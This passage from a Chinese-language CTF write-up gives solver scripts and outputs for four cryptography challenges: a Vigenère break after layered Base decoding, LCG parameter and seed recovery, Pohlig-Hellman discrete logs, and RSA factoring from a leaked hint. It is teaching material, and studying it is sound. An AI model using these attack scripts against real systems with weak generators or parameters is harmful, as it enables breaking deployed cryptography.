    print(f"[+] 推测密钥长度: {best_len} (IC≈{best_ic:.4f})")

    # 对每个位置做卡方检验求最优移位
    key_chars = []
    for i in range(best_len):
        sub = cipher_letters[i::best_len]
        best_shift, best_score = 0, 999.0
        for sh in range(26):
            dec = ''.join(chr((ord(c)-ord('A')-sh) % 26 + ord('A')) for c in sub)
            score = chi2(dec)
            if score < best_score:
                best_score, best_shift = score, sh
        key_chars.append(chr(best_shift + ord('A')))
    key = ''.join(key_chars)
    print(f"[+] 密钥: {key}")

    # 解密
    def decrypt_vigenere(text: str, key: str) -> str:
        res, kid = [], 0
        for ch in text:
            if ch.isalpha():
                base = ord('A') if ch.isupper() else ord('a')
                sh = ord(key[kid % len(key)].upper()) - ord('A')
                res.append(chr((ord(ch) - base - sh) % 26 + base))
                kid += 1
            else:
                res.append(ch)
        return ''.join(res)

    plaintext = decrypt_vigenere(text1, key)
    return key, plaintext


def main():
    with open('code.txt', 'r', encoding='utf-8') as f:
        cipher = f.read().strip()

    print("[*] 步骤1: 反推递进 Caesar → text2")
    text2 = recover_text2(cipher)

    print("[*] 步骤2: 逐层剥离 Base 编码 → text1")
    text1 = peel_encodings(text2)
    print(f"[+] text1 长度: {len(text1)}")
    print(text1[:200], "...")

    print("[*] 步骤3: 破 Vigenère")
    key, m = break_vigenere(text1)

    print("\n" + "="*60)
    print("最终明文 m:")
    print(m)
    print("="*60)
    print(f"密钥: {key}")


if __name__ == '__main__':
    main()
```

输出如下：

```txt
> python decrypt.py
[*] 步骤1: 反推递进 Caesar → text2
[+] shift % 26 = 22
[*] 步骤2: 逐层剥离 Base 编码 → text1
[+] 剥离层数: 20
[+] 层顺序(从外到内): ['b16', 'b32', 'b32', 'b32', 'b64', 'b16', 'b64', 'b32', 'b16', 'b16', 'b32', 'b16', 'b64', 'b64', 'b32', 'b64', 'b16', 'b16', 'b32', 'b64']
[+] text1 长度: 356
Achjzdbnjonlwqa: rmi uum qwp dogltlik uwnk bkm kczyyiqb dlcqomgox mt woivabaof fzbxmmuldxkg, tlr bddh clcr mruh dnjbyuieqeghcha ww vyflb wxb lgajom dbmyqev wq baca. Nkqv ql rvy iquam qhys nrz VRT wugs ...
[*] 步骤3: 破 Vigenère
[+] 推测密钥长度: 8 (IC≈0.0536)
[+] 密钥: YOUDIDIT

============================================================
最终明文 m:
Congratulations: you are now familiar with the relevant knowledge of classical cryptography, and have used some vulnerabilities to carry out simple attacks on them. This is the first step for CTF cryptographers . I wish you enjoy the fun of cryptography in the subsequent learning process . flagishere: cIa5slc@I cOd3 1s fUn 7hou9h th3y @r3 n0t 5@f3 3nOu9h
============================================================
密钥: YOUDIDIT
```

```txt
flag{cIa5slc@I_cOd3_1s_fUn_7hou9h_th3y_@r3_n0t_5@f3_3nOu9h}
```

### PRNG_2

题目使用两个独立的 线性同余生成器（LCG）：

$$
s_{i+1} = (a \cdot s_i + b) \bmod n
$$

其中 $a$、$b$ 是与明文相同比特长度的素数，$n$ 是比特长度多 1 的素数。

- 第一部分：从初始种子 $p_1$（flag 前半）出发，连续迭代 10 次，全部输出（output1）。

- 第二部分：从初始种子 $p_2$（flag 后半）出发，迭代 10 次，只保留奇数步后的状态（i % 2 == 1），即输出 $s_2,s_4,s_6,s_8,s_{10}$（output2）。

#### 第一部分（连续状态恢复）

已知三个连续状态 $s_i,s_{i+1},s_{i+2}$：

$$
\begin{align*}
s_{i+1} &\equiv a\cdot s_i + b \pmod{n}\\
s_{i+2} &\equiv a\cdot s_{i+1} + b \pmod{n}
\end{align*}
$$

两式相减消掉 $b$：

$$
a \equiv (s_{i+2}-s_{i+1})\cdot(s_{i+1}-s_i)^{-1} \pmod{n}
$$

再回代求 $b$：

$$
b \equiv s_{i+1} - a\cdot s_i \pmod{n}
$$

用全部输出验证一致性后，由第一个输出反推初始种子：

$$
p_1 \equiv (o_0 - b)\cdot a^{-1} \pmod{n_1}
$$

$p_1 < n_1$，唯一确定

#### 第二部分（隔一步状态恢复）

输出的是每隔一步的状态 $t_i = s_{2i+2}$。

两步递推关系为：

$$
s_{k+2} = a^2\cdot s_k + b(a+1) \pmod{n}
$$

即：

$$
t_{i+1} = A\cdot t_i + B \pmod{n},\quad A=a^2,\quad B=b(a+1)
$$

用同样方法求出 $A,B$。

因为 $n_2$ 是素数，对 $A$ 求模平方根（Tonelli-Shanks 算法）得到两个候选 $a$（$a$ 与 $-a$），再分别计算：

$$
b \equiv B\cdot(a+1)^{-1} \pmod{n_2}
$$

筛选出 同时为素数 的那一对 $(a,b)$（符合题目 getPrime 生成方式）。

最后由第一个输出反推：

$$
p_2 \equiv (t_0 - B)\cdot A^{-1} \pmod{n_2}
$$

拼接将两部分明文按字节拼接即可得到完整 flag。

解密脚本如下：

```py
import random

def long_to_bytes(n: int) -> bytes:
    if n == 0:
        return b'\x00'
    return n.to_bytes((n.bit_length() + 7) // 8, 'big')


def is_prime(n: int, k: int = 12) -> bool:
    """Miller-Rabin 素性测试（确定性足够覆盖 168-bit）"""
    if n <= 1:
        return False
    if n <= 3:
        return True
    if n % 2 == 0:
        return False

    # 写出 n-1 = 2^s * d
    d = n - 1
    s = 0
    while d % 2 == 0:
        d //= 2
        s += 1

    # 对 168-bit 数，这几个基已经足够确定性
    bases = [2, 3, 5, 7, 11, 13, 23, 29, 31, 37]
    for a in bases:
        if a >= n:
            continue
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(s - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def tonelli_shanks(n: int, p: int) -> int:
    """计算 n 模奇素数 p 的平方根"""
    assert pow(n, (p - 1) // 2, p) == 1, "不是二次剩余"
    if n == 0:
        return 0
    # 快速路径：p ≡ 3 mod 4
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)

    # 分解 p-1 = Q * 2^S
    Q = p - 1
    S = 0
    while Q % 2 == 0:
        Q //= 2
        S += 1

    # 找非二次剩余
    z = 2
    while pow(z, (p - 1) // 2, p) != p - 1:
        z += 1

    m = S
    c = pow(z, Q, p)
    r = pow(n, (Q + 1) // 2, p)
    t = pow(n, Q, p)

    while t != 1:
        # 找最小 i (0 < i < m) 使得 t^{2^i} ≡ 1
        i = 0
        temp = t
        while temp != 1:
            temp = (temp * temp) % p
            i += 1
            if i >= m:
                raise ValueError("No square root exists")
        # 更新
        b = pow(c, 1 << (m - i - 1), p)
        r = (r * b) % p
        c = (b * b) % p
        t = (t * c) % p
        m = i
    return r


def recover_lcg_params(outputs, n):
    """从连续状态恢复 a, b"""
    s0, s1, s2 = outputs[0], outputs[1], outputs[2]
    diff1 = (s1 - s0) % n
    diff2 = (s2 - s1) % n
    a = (diff2 * pow(diff1, -1, n)) % n
    b = (s1 - a * s0) % n
    # 验证所有状态
    for i in range(len(outputs) - 1):
        if (a * outputs[i] + b) % n != outputs[i + 1]:
            raise ValueError("LCG 参数验证失败")
    return a, b


def main():
    # ========== 题目数据 ==========
    n1 = 345134223622032783079861891603548682508177145829327
    output1 = [
        330839794034202427207472630971095027706262016066515,
        207117270962865762741279284229711316037274680157594,
        321630619337144842590729155049041930254500778494595,
        279018642904636806170692019605454218172298842459688,
        73257666380505240523342216196488730390068257083494,
        262605003574917963420333205887758959323129590898843,
        297883743928194730326112948575646978278780812547237,
        12563050321595805393555913504558906099715995945278,
        210594787958272414685984084073600453669550611155703,
        135043240658510317768913877228497338995616361401792
    ]

    n2 = 252359333929140944117674864740305534893587814289093
    output2 = [
        30879929814266350443344267861670172844492662456100,
        36133300745084951798505947884374329171271529323031,
        142262191898417995263001965439693985220619265860585,
        179839309205906046323512790761178931429223389413577,
        244876553270100063362680494485113603921886811448769
    ]

    # ========== 第一部分 ==========
    print("[*] 恢复第一部分 LCG 参数...")
    a1, b1 = recover_lcg_params(output1, n1)
    print(f"    a1 = {a1}")
    print(f"    b1 = {b1}")

    p1 = ((output1[0] - b1) * pow(a1, -1, n1)) % n1
    half1 = long_to_bytes(p1)
    print(f"[+] 前半明文: {half1}")

    # ========== 第二部分 ==========
    print("\n[*] 恢复第二部分两步递推参数 A, B...")
    A, B = recover_lcg_params(output2, n2)
    print(f"    A = {A}")
    print(f"    B = {B}")

    print("[*] 计算 A 的模平方根...")
    sqrt1 = tonelli_shanks(A, n2)
    candidates = [sqrt1, (n2 - sqrt1) % n2]

    a2 = b2 = None
    for cand_a in candidates:
        try:
            inv = pow(cand_a + 1, -1, n2)
            cand_b = (B * inv) % n2
            if is_prime(cand_a) and is_prime(cand_b):
                a2, b2 = cand_a, cand_b
                break
        except ValueError:
            continue

    if a2 is None:
        raise RuntimeError("未找到合法的素数对 (a2, b2)")

    print(f"    a2 = {a2}")
    print(f"    b2 = {b2}")

    # 最终验证
    assert (a2 * a2) % n2 == A
    assert (b2 * (a2 + 1)) % n2 == B

    p2 = ((output2[0] - B) * pow(A, -1, n2)) % n2
    half2 = long_to_bytes(p2)
    print(f"[+] 后半明文: {half2}")

    flag = half1 + half2
    print("\n" + "=" * 50)
    print(f"[+] Flag: {flag.decode()}")
    print("=" * 50)


if __name__ == "__main__":
    main()
```

输出如下：

```txt
> python prng_decrypt.py
[*] 恢复第一部分 LCG 参数...
    a1 = 145424495582725732898799924892598922916299432230689
    b1 = 157817097740657233753049532323533798231689619690069
[+] 前半明文: b'flag{69b8bdd7-a98e-42'

[*] 恢复第二部分两步递推参数 A, B...
    A = 127493981115879572623164979996887693617816899119548
    B = 182819228795212232540344728504035098857603496043689
[*] 计算 A 的模平方根...
    a2 = 96363134065700340835255095067002682077714017895943
    b2 = 145290317527158546885587912146880103158505104712839
[+] 后半明文: b'bc-ad98-7ba4e2c1df56}'

==================================================
[+] Flag: flag{69b8bdd7-a98e-42bc-ad98-7ba4e2c1df56}
==================================================
```

```txt
flag{69b8bdd7-a98e-42bc-ad98-7ba4e2c1df56}
```

### DLP

这是一道离散对数问题：已知 $p$、$g=67$、$h$，求 $x$ 使得
$$h \equiv g^x \pmod{p}$$
其中 x = \text{bytes_to_long}(\text{flag} + \text{padding})。

观察 $p-1$ 的结构$p$ 是一个约 1015-bit 的素数。对 $p-1$ 进行因式分解：

$$
p-1 = 2^{32} \times 3^{21} \times 5^{15} \times 7^{41} \times 11^{35} \times 13^{40} \times 17^{48} \times 19^{9} \times 23^{30} \times 29^{33}
$$

$p-1$ 完全光滑（所有素因子都非常小）。因此 $g$ 的阶 $\operatorname{ord}_p(g) = p-1$，可以用 Pohlig-Hellman 算法 高效求解 DLP。

Pohlig-Hellman 算法

对每个素因子幂 $q^e \mid (p-1)$，把问题约化到阶为 $q^e$ 的子群：

$$
g_q = g^{(p-1)/q^e} \bmod p,\quad
h_q = h^{(p-1)/q^e} \bmod p
$$

求 $x_q$ 使得 $g_q^{x_q} \equiv h_q \pmod{p}$，其中 $x_q \bmod q^e$。

对素数幂 $q^e$ 使用逐级提升（lifting）：先求模 $q$ 的解，再逐步提升到 $q^2, q^3, \dots, q^e$。每一步只需要在阶为 $q$ 的循环群中求一次离散对数。

阶为 $q$ 的小群离散对数用 Baby-Step Giant-Step（BSGS） 即可（$q$ 最大也就几十，非常快）。

中国剩余定理（CRT）得到所有同余式$$x \equiv x_q \pmod{q^e}$$后，用 CRT 合并即可得到模 $p-1$ 的唯一解 $x$。

解密脚本如下：

```py
import math
from sympy import factorint
from sympy.ntheory.modular import crt

def bsgs(g, h, p, order):
    """Baby-step giant-step: solve g^x ≡ h (mod p), ord(g)=order"""
    m = math.isqrt(order) + 1
    table = {}
    e = 1
    for j in range(m):
        table[e] = j
        e = (e * g) % p
    inv_gm = pow(pow(g, m, p), -1, p)
    gamma = h
    for i in range(m):
        if gamma in table:
            return i * m + table[gamma]
        gamma = (gamma * inv_gm) % p
    raise ValueError("DL not found")

def pohlig_hellman(g, h, p, factors):
    n = p - 1
    congruences, moduli = [], []
    for q, e in factors.items():
        print(f"[*] Solving subgroup of order {q}^{e} ...", end=" ", flush=True)
        qe = q ** e
        g_q = pow(g, n // qe, p)
        h_q = pow(h, n // qe, p)

        x = 0
        gamma = pow(g_q, qe // q, p)
        for k in range(e):
            hk = pow(h_q * pow(g_q, -x, p) % p, qe // (q ** (k + 1)), p)
            y = bsgs(gamma, hk, p, q)
            x += y * (q ** k)
        print(f"x ≡ {x}")
        congruences.append(x)
        moduli.append(qe)
    return crt(moduli, congruences)[0]

if __name__ == "__main__":
    p = 297751278340429922876319037296834193695260884029022823776771691112509083570192681615128896764413159854049602632753655834969250860917990516463469615318547186067265283559973190956770036737943380819257234228463837255218436679709684989550810248627500085836286956146521450588530741131451722498048000000000000001
    g = 67
    h = 187932374108597972139231537390177634849060339849637386237933234652309505738605832080521003559765407153218343150744608751920963128022039387722132496897198510862825508806829515707220156826677692812227453889380536566602180649139793952454821678889992002679572312352753992000623596893433663213586134172004560486

    factors = factorint(p - 1)
    print("[+] Factorization of p-1:", factors)

    x = pohlig_hellman(g, h, p, factors)
    print("\n[+] Discrete log x =", x)

    msg = x.to_bytes((x.bit_length() + 7) // 8, "big")
    print("[+] Message bytes:", msg)
    print("[+] Flag:", msg.split(b"}")[0].decode() + "}")
```

输出如下：

```txt
> python dlp_decrypt.py
[+] Factorization of p-1: {2: 32, 3: 21, 5: 15, 7: 41, 11: 35, 13: 40, 17: 48, 19: 9, 23: 30, 29: 33}
[*] Solving subgroup of order 2^32 ... x ≡ 2683065240
[*] Solving subgroup of order 3^21 ... x ≡ 3224728631
[*] Solving subgroup of order 5^15 ... x ≡ 11380639846
[*] Solving subgroup of order 7^41 ... x ≡ 5982889439850260430681830064299668
[*] Solving subgroup of order 11^35 ... x ≡ 2405192800283141989504116457657449227
[*] Solving subgroup of order 13^40 ... x ≡ 211741902705524125261262515194713640971133621
[*] Solving subgroup of order 17^48 ... x ≡ 27793648471499967840787429274532914370981201634257210617353
[*] Solving subgroup of order 19^9 ... x ≡ 295674545413
[*] Solving subgroup of order 23^30 ... x ≡ 59038397270900825002575769523176332062502
[*] Solving subgroup of order 29^33 ... x ≡ 1237268971721631893063296386074198016288970993228

[+] Discrete log x = 280953633736579516380006790191442076602299046560224360069384963203268368431485627513231696371620228733414385366446889067539755415508048760406739437507785953738315064708791612842920747273530185036291780563280696406388985155889719324764996561952701472224142224551242795976113541707318812766591925609525171096
[+] Message bytes: b'flag{pohlig_hellman_crt_smooth_group_order}S1\x19d\x95\xb5\x1a\x1d\xeb,\xcb\x03c\x0b]%eGr\x0e\x80og9\xab?\x1d\x06s\x95Y\xda\xd7k\xb3\xc5R+D\x96\xe1\x9b\x9bIFC\xa9c\x83pD\xba\x1c\xbb*\x86jd\xcf;\xe3\xdf0\xb3\xa5\x14\xb5\xefy\x9c\xe22\xf0\xce\x87\xceg\x87q\xb7\x9f\xecS\x98'
[+] Flag: flag{pohlig_hellman_crt_smooth_group_order}
```

```txt
flag{pohlig_hellman_crt_smooth_group_order}
```

### RSA_2

由源码可知：

$e = 65537$
$p,q$ 均为 512-bit 素数且 $q > p$
$n = p q$
$c = m^e \bmod n$
$a,b$ 均为 20-bit 素数
$\mathrm{hint} = (a p + b + q)^{q(p-1)+1} \bmod p$

1. 化简 hint

在模 $p$ 下 $a p \equiv 0$，故

$$
\mathrm{hint} \equiv (b+q)^{q(p-1)+1} \pmod{p}.
$$

指数可写为

$$
q(p-1)+1 = q\cdot(p-1)+1.
$$

由 Fermat 小定理（$p\nmid(b+q)$，否则 $\mathrm{hint}=0$，与给定值矛盾）：

$$
(b+q)^{p-1}\equiv 1\pmod{p},
$$

于是

$$
(b+q)^{q(p-1)+1}\equiv(b+q)\cdot 1^q\equiv b+q\pmod{p}.
$$

即

$$
\mathrm{hint}\equiv q+b\pmod{p}\quad\Rightarrow\quad q+b-\mathrm{hint}=m p
$$

$m$ 为正整数。

2. 确定 $m$ 的可能取值

两素数同为 512-bit，故 $p<q<2p$。结合 $\mathrm{hint}<p$ 及 $b<2^{20}$，可知

$$
0<q+b-\mathrm{hint}<2p+2^{20},
$$

因此 $m=1$ 或 $m=2$。对给定的 $n,\mathrm{hint}$ 的数量级分析（$\sqrt{n}\approx 7.74\times 10^{153}$，$\mathrm{hint}\approx 1.85\times 10^{153}$）表明实际以 $m=1$ 为主。

3. $m=1$ 时的二次方程

假设 $m=1$，则

$$
p=q+b-\mathrm{hint}.
$$

代入 $n=pq$ 得

$$
q^2+(b-\mathrm{hint})q-n=0.
$$

判别式

$$
\Delta=( \mathrm{hint}-b)^2+4n
$$

必须为完全平方 $s^2$，且

$$
q=\frac{\mathrm{hint}-b+s}{2}
$$

为整数，并满足 $n\bmod q=0$、$p=n/q$ 为素数且 $p<q$。

4. 暴力搜索 $b$

$b$ 为 20-bit 素数（共约 $3.86\times 10^4$ 个）。对每个候选 $b$ 计算 $\Delta$ 并检验是否为完全平方即可。实现时使用 sympy.integer_nthroot。

搜索得到唯一解：

$$
b=1037801,
$$

$$
\begin{align*}
p&=6866323681716969257795127567315445106103921415475902940702694659309786687945290329949653674647467557687118224057619528722699270690995323377583069329362813,\\
q&=8720666768080635701141877044729969565994709984586372548535282850405888781931120757650733396944198532498565877506574168050328692668556327827837452042410779.
\end{align*}
$$

验证：两者均为素数、$p q=n$、$q>p$ 且 $p=q+b-\mathrm{hint}$。
（$m=2$ 的情形同样可枚举，但无解。）

5. 解密

$$
\phi(n)=(p-1)(q-1),\qquad d=e^{-1}\bmod\phi(n),
$$

$$
m=c^d\bmod n.
$$

还原字节串即得 flag。

解密脚本如下：

```py
from sympy import primerange, integer_nthroot, mod_inverse, isprime

n = 59878920750034253812473916340427652696560588929372376557862758783297756217351793935299237589505012171600483114513575202287730929631181203092270509860028866490602056368325281902687469924527425830180642599931707560453268265288811481630010690956233477339712644022013247635301441507133491427120004941760472961327
c = 40630384401002342470066039506463698639721393853932077385540834977108410392196020666308614792019750257385381212472208140240697164618704604584575103484957043286794695262059432859884887458598880103340996156307514966232819295198837243538574907731969826746889643067794946689997308561092889506010185682571054588232
hint = 1854343086363666443346749477414524459890788569110469607832588191096102093985830427701079722296730974811447653448954639327629421977561004450254382714085767
e = 65537

# 暴力 20-bit 素数 b，求解 m=1 情形
primes = list(primerange(1 << 19, 1 << 20))
p = q = None
for b in primes:
    disc = (hint - b) ** 2 + 4 * n
    s, exact = integer_nthroot(disc, 2)
    if exact and (hint - b + s) % 2 == 0:
        qq = (hint - b + s) // 2
        if qq > 1 and n % qq == 0:
            pp = n // qq
            if pp * qq == n and 1 < pp < qq and isprime(pp) and isprime(qq):
                # 二次确认关系
                if pp == qq + b - hint:
                    p, q = pp, qq
                    break

assert p is not None
print(f"p = {p}")
print(f"q = {q}")
print(f"b = {b}")

# RSA 解密
phi = (p - 1) * (q - 1)
d = mod_inverse(e, phi)
m = pow(c, d, n)
flag = m.to_bytes((m.bit_length() + 7) // 8, "big")
print(flag)
```

输出如下：

```txt
> python rsa_2.py
p = 6866323681716969257795127567315445106103921415475902940702694659309786687945290329949653674647467557687118224057619528722699270690995323377583069329362813
q = 8720666768080635701141877044729969565994709984586372548535282850405888781931120757650733396944198532498565877506574168050328692668556327827837452042410779
b = 1037801
b"flag{y0u_kn0w_RS@_and_f3rmat's_1ittl3_the0r3m}"
```

```txt
flag{y0u_kn0w_RS@_and_f3rmat's_1ittl3_the0r3m}
```

